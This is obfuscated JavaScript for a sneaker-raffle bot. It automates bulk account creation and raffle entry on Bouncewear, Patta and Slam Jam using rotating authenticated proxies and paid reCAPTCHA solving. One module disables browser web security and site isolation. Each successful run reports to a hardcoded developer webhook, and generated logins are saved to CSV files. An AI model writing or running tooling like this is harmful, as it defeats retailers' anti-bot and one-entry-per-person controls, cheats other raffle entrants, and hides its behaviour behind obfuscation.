            }), await _0x4650f8['goto'](_0x7fd3b), await _0x1b3ea1(0xbb8), await _0x4650f8['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Filling\x20information'), await _0x4650f8['type']('#RegisterForm-FirstName', '' + bouncewear[_0x4addb5]['FirstName']), await _0x1b3ea1(0x226), await _0x4650f8['type']('#RegisterForm-LastName', '' + bouncewear[_0x4addb5]['LastName']), await _0x1b3ea1(0x226), await _0x4650f8['type']('#RegisterForm-email', '' + bouncewear[_0x4addb5]['Email']), await _0x1b3ea1(0x226), await _0x4650f8['type']('#RegisterForm-password', '' + bouncewear[_0x4addb5]['Password']), await _0x1b3ea1(0x226), await _0x4650f8['click']('#marketing'), console['log'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Submitting..'), await _0x4650f8['$eval']('#RegisterForm', _0xc0be01 => _0xc0be01['submit']()), await _0x1b3ea1(0x1f40), console['log'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x4650f8['solveRecaptchas'](), await _0x4650f8['click']('.shopify-challenge__button.btn');
            async function _0x427d5a() {
                for (var _0x347967 = 0x0; _0x347967 < 0x4; _0x347967++) {
                    try {
                        console['log']('try'), await _0x4650f8['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20' + _0x3e492c['red']('Catpcha\x20failed,\x20retrying..')), await _0x4650f8['solveRecaptchas'](), await _0x4650f8['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x427d5a(), console['log'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1b3ea1(0x1f4);
            try {
                await _0x4650f8['waitForSelector']('.featured-title'), await _0x1b3ea1(0x1f4), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x4addb5]['Email'] + '\x20Generated!')), _0x16016b['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x4addb5]['Email'] + ',' + bouncewear[_0x4addb5]['Password']), console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x75c43['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x4addb5]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x49775d) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x49775d));
            }
        } catch (_0x4f415e) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x4addb5 + 0x1) + '\x20:\x20' + _0x4f415e));
        } finally {
            _0x2fc3b2 && _0x2fc3b2['close'](), console['log']('Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x1bfc79(_0x613142, _0x3c6e1b, _0x1d3edd, _0x1f203e) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xef4874 = 0x0; _0xef4874 < _0x1d3edd['length']; _0xef4874++) {
        var _0x6715f2 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x44c289
                }
            ]
        }];
        const _0x57e4fc = { 'embeds': _0x6715f2 };
        _0x2768f8(_0x3c6e1b['name'] + '\x20Task\x20' + (_0xef4874 + 0x1) + '\x20/\x20' + _0x1d3edd['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x1d3edd, _0xef4874);
        var _0x581d08 = await _0x555e75(_0x1d3edd[_0xef4874], _0x3c6e1b, 'acc', ![]);
        const _0x4d426e = { 'succesDEVMSG': { 'embeds': [_0x581d08] } };
        if (_0x1d3edd[_0xef4874]['Email'] == '' || _0x1d3edd[_0xef4874]['FirstName'] == '' || _0x1d3edd[_0xef4874]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1b3ea1(0x7d0);
            continue;
        }
        (_0x1d3edd[_0xef4874]['Password'] == '' || _0x1d3edd[_0xef4874] == undefined) && _0x1d3edd[_0xef4874]['Password'] == 'JRaffles23!';
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x200723 = _0x1f203e[_0xef4874]['split'](':');
        else
            var _0xd0c029 = Math['round'](Math['random']() * (_0x1f203e['length'] - 0x1)), _0x200723 = _0x1f203e[_0xd0c029]['split'](':');
        const _0x41f616 = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x200723[0x0] + ':' + _0x200723[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x32d211 = await _0x41f616['newPage']();
            await _0x32d211['authenticate']({
                'username': '' + _0x200723[0x2],
                'password': '' + _0x200723[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x3c6e1b['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x32d211['setRequestInterception'](!![]), _0x32d211['on']('request', _0x5a6af9 => {
                _0x5a6af9['resourceType']() === 'image' || _0x5a6af9['resourceType']() === 'font' || _0x5a6af9['resourceType']() === 'media' ? _0x5a6af9['abort']() : _0x5a6af9['continue']();
            }), await _0x32d211['goto'](_0x613142), await _0x1b3ea1(0xbb8), await _0x32d211['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x561248() + '\x20[' + _0x3c6e1b['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20Filling\x20information'), await _0x32d211['type']('#RegisterForm-FirstName', '' + _0x1d3edd[_0xef4874]['FirstName']), await _0x1b3ea1(0x226), await _0x32d211['type']('#RegisterForm-LastName', '' + _0x1d3edd[_0xef4874]['LastName']), await _0x1b3ea1(0x226), await _0x32d211['type']('#RegisterForm-email', '' + _0x1d3edd[_0xef4874]['Email']), await _0x1b3ea1(0x226), await _0x32d211['type']('#RegisterForm-password', '' + _0x1d3edd[_0xef4874]['Password']), await _0x1b3ea1(0x226), console['log'](_0x561248() + '\x20[' + _0x3c6e1b['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20Submitting..'), await _0x32d211['$eval']('#RegisterForm', _0x14dc45 => _0x14dc45['submit']()), await _0x1b3ea1(0x1f40);
            try {
                await _0x32d211['waitForSelector']('.home-page-grid__collection'), await _0x1b3ea1(0x1f4), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x3c6e1b['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20Account\x20' + _0x1d3edd[_0xef4874]['Email'] + '\x20Generated!')), _0x16016b['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x1d3edd[_0xef4874]['Email'] + ',' + _0x1d3edd[_0xef4874]['Password']), console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x3c6e1b['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20Account\x20' + _0x1d3edd[_0xef4874]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x4d426e['succesDEVMSG']);
                } catch {
                }
                await _0x57e113(_0x4f5698, _0x4d426e['succesDEVMSG']);
            } catch (_0xc8f8cd) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0xc8f8cd));
            }
        } catch (_0x168e85) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0xef4874 + 0x1) + '\x20:\x20' + _0x168e85));
        } finally {
            _0x41f616 && _0x41f616['close'](), console['log']('Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x57c2ca(_0x44a0b9, _0xbe364c, _0x161c7d, _0x207663) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x10f3f6 = 0x0; _0x10f3f6 < _0x161c7d['length']; _0x10f3f6++) {
        var _0x214557;
        if (_0x5eb32b != 'yes')
            var _0x5eb32b = '', _0x3fa403 = 0x0;
        _0x2768f8(_0xbe364c['name'] + '\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20/\x20' + _0x161c7d['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x161c7d, _0x10f3f6);
        if (_0x161c7d[_0x10f3f6]['Email'] == '' || _0x161c7d[_0x10f3f6]['Password'] == '' || _0x161c7d[_0x10f3f6]['FirstName'] == '' || _0x161c7d[_0x10f3f6]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0xef98bb = _0x207663[_0x10f3f6]['split'](':');
        else
            var _0x4a0f8c = Math['round'](Math['random']() * (_0x207663['length'] - 0x1)), _0xef98bb = _0x207663[_0x4a0f8c]['split'](':');
        const _0xa83528 = await _0x114f6['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xef98bb[0x0] + ':' + _0xef98bb[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x38b8f4 = await _0xa83528['newPage']();
            await _0x38b8f4['authenticate']({
                'username': '' + _0xef98bb[0x2],
                'password': '' + _0xef98bb[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x38b8f4['setRequestInterception'](!![]), _0x38b8f4['on']('request', _0x1bdcb7 => {
                _0x1bdcb7['resourceType']() === 'image' || _0x1bdcb7['resourceType']() === 'font' || _0x1bdcb7['resourceType']() === 'media' ? _0x1bdcb7['abort']() : _0x1bdcb7['continue']();
            }), await _0x38b8f4['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x38b8f4['waitForSelector']('#CustomerEmail'), console['log'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x38b8f4['type']('#CustomerEmail', '' + _0x161c7d[_0x10f3f6]['Email']), await _0x1b3ea1(0x12c), await _0x38b8f4['type']('#CustomerPassword', '' + _0x161c7d[_0x10f3f6]['Password']), await _0x1b3ea1(0x226), await _0x38b8f4['$eval']('#customer_login', _0x42e240 => _0x42e240['submit']());
            try {
                await _0x38b8f4['waitForSelector']('#orders'), await _0x1b3ea1(0x4b0);
            } catch {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x38b8f4['goto']('' + _0x161c7d[_0x10f3f6]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x1b3ea1(0xbb8), console['log'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x38b8f4['waitForSelector']('#email');
            } catch {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x38b8f4['type']('#email', '' + _0x161c7d[_0x10f3f6]['Email']), await _0x1b3ea1(0x384), await _0x38b8f4['type']('#first_name', '' + _0x161c7d[_0x10f3f6]['FirstName']), await _0x1b3ea1(0x514), await _0x38b8f4['type']('#last_name', '' + _0x161c7d[_0x10f3f6]['LastName']), await _0x1b3ea1(0x514), await _0x38b8f4['type']('#street_address', _0x161c7d[_0x10f3f6]['Address1'] + '\x20' + _0x161c7d[_0x10f3f6]['HouseNumber'] + '\x20' + _0x161c7d[_0x10f3f6]['Address2']), await _0x1b3ea1(0x2bc);
            _0x161c7d[_0x10f3f6]['Postcode'] == undefined && (_0x161c7d[_0x10f3f6]['Postcode'] = _0x161c7d[_0x10f3f6]['Zip']);
            await _0x38b8f4['type']('#zip_code', '' + _0x161c7d[_0x10f3f6]['Postcode']), await _0x1b3ea1(0x320), await _0x38b8f4['type']('#city', '' + _0x161c7d[_0x10f3f6]['City']), await _0x1b3ea1(0x320), await _0x38b8f4['type']('#bday', '01/01/1994'), await _0x1b3ea1(0x320), await _0x38b8f4['type']('#instagram', '' + _0x161c7d[_0x10f3f6]['Follower']), await _0x1b3ea1(0x352);
            if (_0x161c7d[_0x10f3f6]['Size'] == 'RANDOM') {
                const _0x54291a = await _0x38b8f4['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x1aa2c9 => {
                    return _0x1aa2c9['map'](_0x4aa210 => _0x4aa210['textContent']);
                });
                var _0x41742e = Math['round'](Math['random']() * (_0x54291a['length'] - 0x1));
                console['log'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x54291a[_0x41742e]), await _0x38b8f4['click']('label[data-eu-size=\x22' + _0x54291a[_0x41742e] + '\x22]');
            } else {
                console['log'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x161c7d[_0x10f3f6]['Size']);
                try {
                    await _0x38b8f4['click']('label[data-eu-size=\x22' + _0x161c7d[_0x10f3f6]['Size'] + '\x22]');
                } catch {
                    await _0x38b8f4['click']('label[data-eu-size=\x22' + _0x161c7d[_0x10f3f6]['Size'] + '.0\x22]');
                }
            }
            await _0x1b3ea1(0xbb8), await _0x38b8f4['$$eval']('.raffle__checkbox-label', _0x572e0c => _0x572e0c['forEach'](_0x2478a2 => _0x2478a2['click']())), await _0x1b3ea1(0x7d0), console['log'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x38b8f4['click']('#raffle__form-submit'), await _0x1b3ea1(0x1388);
            try {
                await _0x38b8f4['waitForSelector']('#raffle__confirmation-message-container'), _0x5eb32b = 'no', _0x1dc885(_0x161c7d[_0x10f3f6], _0xbe364c), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x29c427) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x29c427));
            }
        } catch (_0x55f704) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20' + _0x55f704)), _0x5eb32b = 'yes';
        } finally {
            _0xa83528 && _0xa83528['close']();
            if (_0x5eb32b == 'yes' && _0x3fa403 != 0x5 && _0x214557 != 'Size\x20Not\x20Found') {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0xbe364c['name'] + ']\x20Task\x20' + (_0x10f3f6 + 0x1) + '\x20:\x20Retrying')), _0x10f3f6 = _0x10f3f6 - 0x1, _0x3fa403 = _0x3fa403 + 0x1;
                continue;
            }
            _0x5eb32b == 'yes' && _0x3fa403 >= 0x5 && (_0x254c07(_0x161c7d[_0x10f3f6], _0xbe364c), _0x5eb32b = 'no', _0x3fa403 = 0x0), console['log']('Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x95e080(_0x1aa8b6, _0x16fbad, _0x4792d1, _0x3f8b89) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xe8814e = 0x0; _0xe8814e < _0x4792d1['length']; _0xe8814e++) {
        if (_0x4e5ce2 != 'yes')
            var _0x4e5ce2 = '', _0x19379b = 0x0;
        var _0x60ab49 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x44c289
                }
            ]
        }];
        const _0x57543c = { 'embeds': _0x60ab49 };
        _0x2768f8(_0x16fbad['name'] + '\x20Task\x20' + (_0xe8814e + 0x1) + '\x20/\x20' + _0x4792d1['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x4792d1, _0xe8814e);
        var _0x5a2ac1 = await _0x555e75(_0x4792d1[_0xe8814e], _0x16fbad, 'acc', ![]);
        const _0x1d39fd = { 'succesDEVMSG': { 'embeds': [_0x5a2ac1] } };
        if (_0x4792d1[_0xe8814e]['Email'] == '' || _0x4792d1[_0xe8814e]['FirstName'] == '' || _0x4792d1[_0xe8814e]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1b3ea1(0x7d0);
            continue;
        }
        (_0x4792d1[_0xe8814e]['Password'] == '' || _0x4792d1[_0xe8814e] == undefined) && _0x4792d1[_0xe8814e]['Password'] == 'JRaffles23!';
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x3c7a1c = _0x3f8b89[_0xe8814e]['split'](':');
        else
            var _0x1910e6 = Math['round'](Math['random']() * (_0x3f8b89['length'] - 0x1)), _0x3c7a1c = _0x3f8b89[_0x1910e6]['split'](':');
        const _0x25d241 = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3c7a1c[0x0] + ':' + _0x3c7a1c[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x307e1a = await _0x25d241['newPage']();
            await _0x307e1a['authenticate']({
                'username': '' + _0x3c7a1c[0x2],
                'password': '' + _0x3c7a1c[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x307e1a['setRequestInterception'](!![]), _0x307e1a['on']('request', _0x3905aa => {
                _0x3905aa['resourceType']() === 'image' || _0x3905aa['resourceType']() === 'font' || _0x3905aa['resourceType']() === 'media' ? _0x3905aa['abort']() : _0x3905aa['continue']();
            }), await _0x307e1a['goto']('https://drop.slamjam.com/account/register'), await _0x1b3ea1(0xbb8), await _0x307e1a['waitForSelector']('#FirstName'), await _0x307e1a['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x307e1a['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Filling\x20information'), await _0x1b3ea1(0x4b0), await _0x307e1a['type']('#FirstName', '' + _0x4792d1[_0xe8814e]['FirstName']), await _0x1b3ea1(0x226), await _0x307e1a['type']('#LastName', '' + _0x4792d1[_0xe8814e]['LastName']), await _0x1b3ea1(0x226), await _0x307e1a['type']('#Email', '' + _0x4792d1[_0xe8814e]['Email']), await _0x1b3ea1(0x2ee), await _0x307e1a['type']('#ConfirmEmail', '' + _0x4792d1[_0xe8814e]['Email']), await _0x1b3ea1(0x2ee), await _0x307e1a['type']('#CreatePassword', '' + _0x4792d1[_0xe8814e]['Password']), await _0x1b3ea1(0x2ee), await _0x307e1a['type']('#CreateConfirmPassword', '' + _0x4792d1[_0xe8814e]['Password']), await _0x1b3ea1(0x226), console['log'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Submitting..'), await _0x307e1a['$eval']('#create_customer', _0xe9ea6d => _0xe9ea6d['submit']()), await _0x1b3ea1(0x1388), console['log'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20' + _0x3e492c['cyan']('Solving\x20Captcha')), await _0x307e1a['solveRecaptchas'](), console['log'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x307e1a['$eval']('.shopify-challenge__container\x20>\x20form', _0x467aaa => _0x467aaa['submit']());
            try {
                await _0x307e1a['waitForSelector']('.product-card__image'), await _0x1b3ea1(0x1f4), _0x4e5ce2 = 'no', console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Account\x20' + _0x4792d1[_0xe8814e]['Email'] + '\x20Generated!')), _0x16016b['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x4792d1[_0xe8814e]['Email'] + ',' + _0x4792d1[_0xe8814e]['Password']), console['log'](_0x3e492c['yellow'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Account\x20' + _0x4792d1[_0xe8814e]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x1d39fd['succesDEVMSG']);
                } catch {
                }
                await _0x57e113(_0x4f5698, _0x1d39fd['succesDEVMSG']);
            } catch (_0x39184d) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x39184d));
            }
        } catch (_0x49158f) {
            console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20' + _0x49158f));
        } finally {
            _0x25d241 && _0x25d241['close']();
            if (_0x4e5ce2 == 'yes' && _0x19379b != 0x5) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x16fbad['name'] + ']\x20Task\x20' + (_0xe8814e + 0x1) + '\x20:\x20Retrying')), _0xe8814e = _0xe8814e - 0x1, _0x19379b = _0x19379b + 0x1;
                continue;
            }
            _0x4e5ce2 == 'yes' && _0x19379b >= 0x5 && (_0x254c07(_0x4792d1[_0xe8814e], _0x16fbad), _0x4e5ce2 = 'no', _0x19379b = 0x0), console['log']('Waiting\x20for\x20' + _0xc43b8d['delay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['delay']);
        }
    }
}
async function _0x5bd077(_0x305329, _0x274bc6, _0x12f5f0, _0x8f8370) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5d1f9a = 0x0; _0x5d1f9a < _0x12f5f0['length']; _0x5d1f9a++) {
        var _0x49086e;
        if (_0x599ce8 != 'yes')
            var _0x599ce8 = '', _0x56eb8b = 0x0;
        _0x2768f8(_0x274bc6['name'] + '\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20/\x20' + _0x12f5f0['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x12f5f0, _0x5d1f9a);
        if (_0x12f5f0[_0x5d1f9a]['Email'] == '' || _0x12f5f0[_0x5d1f9a]['Password'] == '' || _0x12f5f0[_0x5d1f9a]['FirstName'] == '' || _0x12f5f0[_0x5d1f9a]['LastName'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x4addac = _0x8f8370[_0x5d1f9a]['split'](':');
        else
            var _0x5d568f = Math['round'](Math['random']() * (_0x8f8370['length'] - 0x1)), _0x4addac = _0x8f8370[_0x5d568f]['split'](':');
        const _0x4a911f = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x4addac[0x0] + ':' + _0x4addac[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x1bc78e = await _0x4a911f['newPage']();
            await _0x1bc78e['authenticate']({
                'username': '' + _0x4addac[0x2],
                'password': '' + _0x4addac[0x3]
            }), await _0x1bc78e['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1bc78e['setRequestInterception'](!![]), _0x1bc78e['on']('request', _0x1a7913 => {
                _0x1a7913['resourceType']() === 'image' || _0x1a7913['resourceType']() === 'font' || _0x1a7913['resourceType']() === 'media' ? _0x1a7913['abort']() : _0x1a7913['continue']();
            }), await _0x1bc78e['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x1bc78e['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1bc78e['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1b3ea1(0x258), await _0x1bc78e['waitForSelector']('#CustomerEmail'), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1bc78e['type']('#CustomerEmail', '' + _0x12f5f0[_0x5d1f9a]['Email']), await _0x1b3ea1(0x12c), await _0x1bc78e['type']('#CustomerPassword', '' + _0x12f5f0[_0x5d1f9a]['Password']), await _0x1b3ea1(0x226), await _0x1bc78e['$eval']('#customer_login', _0x5e4b28 => _0x5e4b28['submit']()), await _0x1b3ea1(0x7d0), await _0x1bc78e['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20' + _0x3e492c['cyan']('Solving\x20Captcha')), await _0x1bc78e['solveRecaptchas'](), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1bc78e['$eval']('.shopify-challenge__container\x20>\x20form', _0x76fe6 => _0x76fe6['submit']());
            try {
                await _0x1bc78e['waitForSelector']('.nav-account'), await _0x1b3ea1(0x4b0);
            } catch {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x1bc78e['goto']('' + _0x12f5f0[_0x5d1f9a]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x1b3ea1(0xbb8), console['log'](_0x561248() + '\x20[' + _0x274bc6['name'] + ']\x20Task\x20' + (_0x5d1f9a + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x1bc78e['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
